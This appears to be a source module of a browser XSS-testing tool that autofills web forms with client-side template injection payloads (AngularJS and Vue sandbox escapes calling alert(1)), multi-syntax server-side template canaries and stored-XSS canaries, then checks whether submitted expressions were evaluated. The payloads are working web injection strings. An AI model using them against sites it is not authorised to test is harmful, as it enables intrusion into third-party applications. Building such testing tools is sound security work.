/**
 * DOM XSS Hunter v4.6 — Fuzzer Autofill
 * CSTI/SSTI/generic autofill form fillers and CSTI confirmation checker.
 */
(function () {
  'use strict';
  const ns = window.__DOMXSS;
  const { truncate, generateCanary } = ns.utils;
  const { getFillerValue, getCanaryValue } = ns.fuzzerHelpers;
  const CONFIG = ns.CONFIG;

  // =====================================================
  // CSTI Auto Fill Forms for Client-Side Template Injection
  // =====================================================

  let cstiAutofillObserver = null;

  /**
   * Pick the best CSTI payload based on detected client-side framework.
   * Falls back to generic {{7*7}} if no specific framework is found.
   */
  function cstiAutofillPayload(input) {
    const fw = ns.state.frameworks;
    const name = (input.name || '').toLowerCase();
    const type = (input.type || 'text').toLowerCase();

    // Determine which framework payloads to use
    let payloads;
    if (fw?.angular?.detected) {
      const ver = parseFloat(fw.angular.version) || 999;
      if (ver >= 1.6) {
        payloads = [
          "{{$on.constructor('alert(1)')()}}",
          "{{constructor.constructor('alert(1)')()}}",
          "{{[].pop.constructor('alert(1)')()}}",
        ];
      } else if (ver >= 1.0) {
        payloads = [
          "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
          "{{constructor.constructor('alert(1)')()}}",
        ];
      } else {
        payloads = ["{{constructor.constructor('alert(1)')()}}"];
      }
    } else if (fw?.vue?.detected) {
      payloads = [
        "{{_c.constructor('alert(1)')()}}",
        "{{this.constructor.constructor('alert(1)')()}}",
      ];
    } else {
      // Generic CSTI — works on many template engines
      payloads = [
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
      ];
    }

    // Cycle through payloads based on input index for variety
    const allInputs = document.querySelectorAll('input, textarea');
    let idx = 0;
    for (let i = 0; i < allInputs.length; i++) {
      if (allInputs[i] === input) { idx = i; break; }
    }
    const payload = payloads[idx % payloads.length];

    // For URL/email fields, embed payload in valid format
    if (type === 'url' || name === 'website' || name === 'url' || name === 'homepage') {
      return `https://test.com/?q=${encodeURIComponent(payload)}`;
    }
    if (type === 'email' || name.includes('email')) {
      return `${payload}@test.com`;
    }
    return payload;
  }

  function cstiFillForm(form) {
    const inputs = form.querySelectorAll('input, textarea, select');
    let filled = 0;
    const filledPayloads = [];
    for (const inp of inputs) {
      const type = (inp.type || 'text').toLowerCase();
      if (['hidden', 'submit', 'button', 'reset', 'file', 'image'].includes(type)) continue;
      if (inp.tagName === 'SELECT') {
        if (inp.options.length > 1) inp.selectedIndex = inp.options.length - 1;
        continue;
      }
      if (type === 'checkbox' || type === 'radio') { inp.checked = true; continue; }
      const payload = cstiAutofillPayload(inp);
      inp.value = payload;
      inp.dispatchEvent(new Event('input', { bubbles: true }));
      inp.dispatchEvent(new Event('change', { bubbles: true }));
      filledPayloads.push({ field: inp.name || inp.id || '?', payload });
      filled++;
    }
    // Save to sessionStorage so we can detect on next page load
    if (filledPayloads.length > 0) {
      try {
        sessionStorage.setItem('__domxss_csti_pending', JSON.stringify({
          ts: Date.now(),
          payloads: filledPayloads,
          formAction: form.action || location.href,
        }));
      } catch (e) { ns.log.debug(e.message); }
    }
    return filled;
  }

  function cstiAutofillAllForms() {
    const forms = document.querySelectorAll('form');
    const standaloneInputs = document.querySelectorAll('input:not(form input), textarea:not(form textarea)');
    let totalFilled = 0;

    const fwName = ns.state.frameworks?.angular?.detected ? `AngularJS ${ns.state.frameworks.angular.version || '?'}`
                 : ns.state.frameworks?.vue?.detected ? `Vue.js ${ns.state.frameworks.vue.version || '?'}`
                 : 'generic';

    for (const form of forms) {
      const count = cstiFillForm(form);
      if (count > 0) {
        totalFilled += count;
        ns.log.info(`%c[CSTI Autofill] Filled ${count} field(s) with ${fwName} payloads in form${form.action ? ': ' + truncate(form.action, 60) : ''}`, 'color:#ff6600;font-weight:bold');
      }
    }

    for (const inp of standaloneInputs) {
      const type = (inp.type || 'text').toLowerCase();
      if (['hidden', 'submit', 'button', 'reset', 'file', 'image'].includes(type)) continue;
      if (type === 'checkbox' || type === 'radio') { inp.checked = true; continue; }
      inp.value = cstiAutofillPayload(inp);
      inp.dispatchEvent(new Event('input', { bubbles: true }));
      inp.dispatchEvent(new Event('change', { bubbles: true }));
      totalFilled++;
    }

    if (totalFilled > 0) {
      ns.log.info(`%c[CSTI Autofill] Total: ${totalFilled} field(s) filled — submit manually to test`, 'color:#ff6600');
    } else {
      ns.log.info('%c[CSTI Autofill] No fillable form fields found on this page', 'color:#888');
    }
    return totalFilled;
  }

  function startCstiAutofill() {
    CONFIG.cstiEnabled = true;

    // Detect frameworks first if not already done
    if (!ns.state.frameworks) {
      try { ns.state.frameworks = ns.frameworks.detectFrameworks(); } catch (e) { ns.log.debug(e.message); }
    }

    const fwName = ns.state.frameworks?.angular?.detected ? 'AngularJS'
                 : ns.state.frameworks?.vue?.detected ? 'Vue.js'
                 : 'generic';
    ns.log.info(`%c[CSTI Autofill] Client-side template injection form filling ENABLED (${fwName})`, 'color:#ff6600;font-weight:bold;font-size:12px');
    ns.log.info('%c[CSTI Autofill] Submit the form manually to test for CSTI', 'color:#ff6600');

    cstiAutofillAllForms();

    if (cstiAutofillObserver) cstiAutofillObserver.disconnect();
    cstiAutofillObserver = new MutationObserver((mutations) => {
      for (const m of mutations) {
        for (const node of m.addedNodes) {
          if (!(node instanceof HTMLElement)) continue;
          if (node.tagName === 'FORM') cstiFillForm(node);
          const nestedForms = node.querySelectorAll?.('form');
          if (nestedForms) { for (const f of nestedForms) cstiFillForm(f); }
        }
      }
    });
    cstiAutofillObserver.observe(document.body, { childList: true, subtree: true });
  }

  function stopCstiAutofill() {
    CONFIG.cstiEnabled = false;
    if (cstiAutofillObserver) {
      cstiAutofillObserver.disconnect();
      cstiAutofillObserver = null;
    }
    ns.log.info('%c[CSTI Autofill] Client-side template injection form filling DISABLED', 'color:#ff4444;font-weight:bold;font-size:12px');
  }

  function toggleCstiAutofill(enabled) {
    if (enabled) startCstiAutofill();
    else stopCstiAutofill();
  }

  // =====================================================
  // SSTI Auto Fill Forms for Template Injection Detection
  // =====================================================

  let sstiAutofillObserver = null;

  /** Combined SSTI canary string that covers all major template syntaxes. */
  const SSTI_CANARY_PAYLOAD = 'SSTIPROBE{{7*7}}${7*7}<%= 7*7 %>#{7*7}${{7*7}}{7*7}SSTIPROBE';

  function sstiAutofillPayload(input) {
    const name = (input.name || '').toLowerCase();
    const type = (input.type || 'text').toLowerCase();
    // For URL/email fields, embed the canary in a valid format
    if (type === 'url' || name === 'website' || name === 'url' || name === 'homepage' || name === 'site' || name === 'link') {
      return `https://SSTIPROBE.test.com/?q={{7*7}}`;
    }
    if (type === 'email' || name.includes('email') || name.includes('correo')) {
      return `SSTIPROBE{{7*7}}@test.com`;
    }
    return SSTI_CANARY_PAYLOAD;
  }

  function sstiFillForm(form) {
    const inputs = form.querySelectorAll('input, textarea, select');
    let filled = 0;
    for (const inp of inputs) {
      const type = (inp.type || 'text').toLowerCase();
      if (['hidden', 'submit', 'button', 'reset', 'file', 'image'].includes(type)) continue;
      if (inp.tagName === 'SELECT') {
        if (inp.options.length > 1) inp.selectedIndex = inp.options.length - 1;
        continue;
      }
      if (type === 'checkbox' || type === 'radio') {
        inp.checked = true;
        continue;
      }
      const payload = sstiAutofillPayload(inp);
      inp.value = payload;
      inp.dispatchEvent(new Event('input', { bubbles: true }));
      inp.dispatchEvent(new Event('change', { bubbles: true }));
      filled++;
    }
    return filled;
  }

  function sstiAutofillAllForms() {
    const forms = document.querySelectorAll('form');
    const standaloneInputs = document.querySelectorAll('input:not(form input), textarea:not(form textarea)');
    let totalFilled = 0;

    for (const form of forms) {
      const count = sstiFillForm(form);
      if (count > 0) {
        totalFilled += count;
        ns.log.info(`%c[SSTI Autofill] Filled ${count} field(s) in form${form.action ? ': ' + truncate(form.action, 60) : ''}`, 'color:#ff00ff;font-weight:bold');
      }
    }

    for (const inp of standaloneInputs) {
      const type = (inp.type || 'text').toLowerCase();
      if (['hidden', 'submit', 'button', 'reset', 'file', 'image'].includes(type)) continue;
      if (type === 'checkbox' || type === 'radio') { inp.checked = true; continue; }
      inp.value = sstiAutofillPayload(inp);
      inp.dispatchEvent(new Event('input', { bubbles: true }));
      inp.dispatchEvent(new Event('change', { bubbles: true }));
      totalFilled++;
    }

    if (totalFilled > 0) {
      ns.log.info(`%c[SSTI Autofill] Total: ${totalFilled} field(s) filled with SSTI canaries`, 'color:#ff00ff');
    }
    return totalFilled;
  }

  function startSstiAutofill() {
    CONFIG.sstiEnabled = true;
    ns.log.info('%c[SSTI Autofill] Template injection form filling ENABLED', 'color:#ff00ff;font-weight:bold;font-size:12px');

    // Fill existing forms immediately
    sstiAutofillAllForms();

    // Watch for dynamically added forms
    if (sstiAutofillObserver) sstiAutofillObserver.disconnect();
    sstiAutofillObserver = new MutationObserver((mutations) => {
      for (const m of mutations) {
        for (const node of m.addedNodes) {
          if (!(node instanceof HTMLElement)) continue;
          if (node.tagName === 'FORM') {
            sstiFillForm(node);
          }
          const nestedForms = node.querySelectorAll?.('form');
          if (nestedForms) {
            for (const f of nestedForms) sstiFillForm(f);
          }
        }
      }
    });
    sstiAutofillObserver.observe(document.body, { childList: true, subtree: true });
  }

  function stopSstiAutofill() {
    CONFIG.sstiEnabled = false;
    if (sstiAutofillObserver) {
      sstiAutofillObserver.disconnect();
      sstiAutofillObserver = null;
    }
    ns.log.info('%c[SSTI Autofill] Template injection form filling DISABLED', 'color:#ff4444;font-weight:bold;font-size:12px');
  }

  function toggleSstiAutofill(enabled) {
    if (enabled) startSstiAutofill();
    else stopSstiAutofill();
  }

  // =====================================================
  // Auto Fill Forms for Stored XSS Detection
  // =====================================================

  let autofillObserver = null;

  function autofillPayload(input) {
    const canary = generateCanary();
    return getCanaryValue(canary, input);
  }

  function fillForm(form) {
    const inputs = form.querySelectorAll('input, textarea, select');
    let filled = 0;
    for (const inp of inputs) {
      const type = (inp.type || 'text').toLowerCase();
      if (['hidden', 'submit', 'button', 'reset', 'file', 'image'].includes(type)) continue;
      if (inp.tagName === 'SELECT') {
        // Pick last option (often more interesting than default)
        if (inp.options.length > 1) inp.selectedIndex = inp.options.length - 1;
        continue;
      }
      if (type === 'checkbox' || type === 'radio') {
        inp.checked = true;
        continue;
      }
      const payload = autofillPayload(inp);
      inp.value = payload;
      inp.dispatchEvent(new Event('input', { bubbles: true }));
      inp.dispatchEvent(new Event('change', { bubbles: true }));
      filled++;
    }
    return filled;
  }

  function autofillAllForms() {
    const forms = document.querySelectorAll('form');
    // Also find standalone inputs not inside a form
    const standaloneInputs = document.querySelectorAll('input:not(form input), textarea:not(form textarea)');
    let totalFilled = 0;

    for (const form of forms) {
      const count = fillForm(form);
      if (count > 0) {
        totalFilled += count;
        ns.log.info(`%c[Autofill] Filled ${count} field(s) in form${form.action ? ': ' + truncate(form.action, 60) : ''}`, 'color:#00ff88;font-weight:bold');
      }
    }

    for (const inp of standaloneInputs) {
      const type = (inp.type || 'text').toLowerCase();
      if (['hidden', 'submit', 'button', 'reset', 'file', 'image'].includes(type)) continue;
      if (type === 'checkbox' || type === 'radio') { inp.checked = true; continue; }
      inp.value = autofillPayload(inp);
      inp.dispatchEvent(new Event('input', { bubbles: true }));
      inp.dispatchEvent(new Event('change', { bubbles: true }));
      totalFilled++;
    }

    if (totalFilled > 0) {
      ns.log.info(`%c[Autofill] Total: ${totalFilled} field(s) filled with XSS canaries`, 'color:#00ff88');
    }
    return totalFilled;
  }

  function startAutofill() {
    CONFIG.autofillEnabled = true;
    ns.log.info('%c[Autofill] Stored XSS form filling ENABLED', 'color:#00ff88;font-weight:bold;font-size:12px');

    // Fill existing forms immediately
    autofillAllForms();

    // Watch for dynamically added forms
    if (autofillObserver) autofillObserver.disconnect();
    autofillObserver = new MutationObserver((mutations) => {
      for (const m of mutations) {
        for (const node of m.addedNodes) {
          if (!(node instanceof HTMLElement)) continue;
          if (node.tagName === 'FORM') {
            fillForm(node);
          }
          const nestedForms = node.querySelectorAll?.('form');
          if (nestedForms) {
            for (const f of nestedForms) fillForm(f);
          }
        }
      }
    });
    autofillObserver.observe(document.body, { childList: true, subtree: true });
  }

  function stopAutofill() {
    CONFIG.autofillEnabled = false;
    if (autofillObserver) {
      autofillObserver.disconnect();
      autofillObserver = null;
    }
    ns.log.info('%c[Autofill] Stored XSS form filling DISABLED', 'color:#ff4444;font-weight:bold;font-size:12px');
  }

  function toggleAutofill(enabled) {
    if (enabled) startAutofill();
    else stopAutofill();
  }

  // =====================================================
  // CSTI Confirmation Detection (runs on page load after form submit)
  // =====================================================

  /**
   * Check if a pending CSTI payload from a previous form submission
   * was reflected and evaluated by the client-side template engine.
   *
   * Detection logic:
   * 1. Check sessionStorage for pending CSTI test
   * 2. Fetch current page HTML and look for the payload in source
   * 3. Check if the rendered DOM does NOT contain the raw {{ }} expression
   *    (AngularJS compiles and removes it) — this means it was EVALUATED
   * 4. Also check URL params and page text for direct reflection
   */
  async function checkCstiConfirmation() {
    try {
      const pending = sessionStorage.getItem('__domxss_csti_pending');
      if (!pending) return;

      const data = JSON.parse(pending);
      // Expire after 5 minutes
      if (Date.now() - data.ts > 300000) {
        sessionStorage.removeItem('__domxss_csti_pending');
        return;
      }

      const fw = ns.state.frameworks;
      const fwName = fw?.angular?.detected ? `AngularJS ${fw.angular.version || '?'}`
                   : fw?.vue?.detected ? `Vue.js ${fw.vue.version || '?'}`
                   : null;

      // AngularJS compiles {{ }} and removes them from the DOM,
      // so we can't check outerHTML — we must fetch the raw server response.
      let rawHTML = '';
      try {
        const resp = await fetch(location.href, { credentials: 'same-origin', headers: { 'Accept': 'text/html' } });
        if (resp.ok) rawHTML = await resp.text();
      } catch (e) { ns.log.debug(e.message); }

      const renderedText = document.body?.innerText || '';

      let confirmed = false;
      let reflected = false;

      for (const entry of data.payloads) {
        const { field, payload } = entry;

        // Check if payload is in URL (reflected via GET param)
        let inURL = false;
        try {
          inURL = decodeURIComponent(location.search).includes(payload) ||
                  decodeURIComponent(location.hash).includes(payload);
        } catch (e) { ns.log.debug(e.message); }

        // Check if payload is in raw server HTML (fetched, not DOM)
        const inRawHTML = rawHTML.includes(payload);

        // Check if the {{ }} expression is visible in rendered text
        // If AngularJS compiled it, {{ }} will be GONE from innerText
        const inRenderedText = renderedText.includes(payload);

        // AngularJS compilation: expression is in raw HTML but not in rendered DOM
        const expressionCore = payload.match(/\{\{(.+?)\}\}/s)?.[1];
        const compiledAway = (inRawHTML || inURL) && !inRenderedText && expressionCore;

        if (compiledAway) {
          confirmed = true;
          ns.log.info('');
          ns.log.info(`%c CSTI CONFIRMED — ${fwName || 'Template engine'} evaluated the expression! `, 'color:#ff0000;font-weight:bold;font-size:16px;background:#1a0000;padding:8px 16px;border:2px solid #ff0000');
          ns.log.info(`%c   Field: %c${field}`, 'color:#ccc', 'color:#00ddff;font-weight:bold');
          ns.log.info(`%c   Payload: %c${payload}`, 'color:#ccc', 'color:#00ff00;font-weight:bold;font-size:13px');
          ns.log.info(`%c   Source: ${inURL ? 'URL parameter (reflected)' : 'form submission (stored/reflected)'}`, 'color:#888');
          ns.log.info(`%c   Raw HTML: payload found | Rendered DOM: payload absent = compiled by ${fwName || 'template engine'}`, 'color:#ff6600');
          ns.log.info('');

          ns.state.findings.flows.push({
            source: { type: 'csti-injection', desc: `CSTI via ${field}` },
            sink: { type: 'template-eval', desc: `${fwName || 'Template engine'} expression evaluation` },
            exploitability: 'likely',
            evidence: payload,
          });
        } else if (inRawHTML || inURL) {
          // In raw HTML/URL but also in rendered text — not compiled (outside ng-app?)
          reflected = true;
          ns.log.info('');
          ns.log.info('%c CSTI payload reflected but NOT evaluated', 'color:#ffaa00;font-weight:bold;font-size:14px');
          ns.log.info(`%c   Field: %c${field}%c  Payload: %c${payload}`, 'color:#ccc', 'color:#00ddff;font-weight:bold', 'color:#ccc', 'color:#ff6600');
          if (fwName) {
            ns.log.info(`%c   ${fwName} detected but expression was not compiled — may be outside ng-app scope or sanitized`, 'color:#888');
          }
          ns.log.info('');
        }
      }

      if (!confirmed && !reflected) {
        // Payload not in page — form may not have been submitted yet, or it's a POST
        // Stay silent to avoid noise
      }

      if (confirmed) {
        sessionStorage.removeItem('__domxss_csti_pending');
      }
    } catch (e) {
      // Silent fail
    }
  }

  Object.assign(ns.fuzzer, {
    cstiAutofillPayload, cstiFillForm, cstiAutofillAllForms,
    startCstiAutofill, stopCstiAutofill, toggleCstiAutofill,
    sstiAutofillPayload, sstiFillForm, sstiAutofillAllForms,
    startSstiAutofill, stopSstiAutofill, toggleSstiAutofill,
    autofillPayload, fillForm, autofillAllForms,
    startAutofill, stopAutofill, toggleAutofill,
    checkCstiConfirmation,
  });
})();
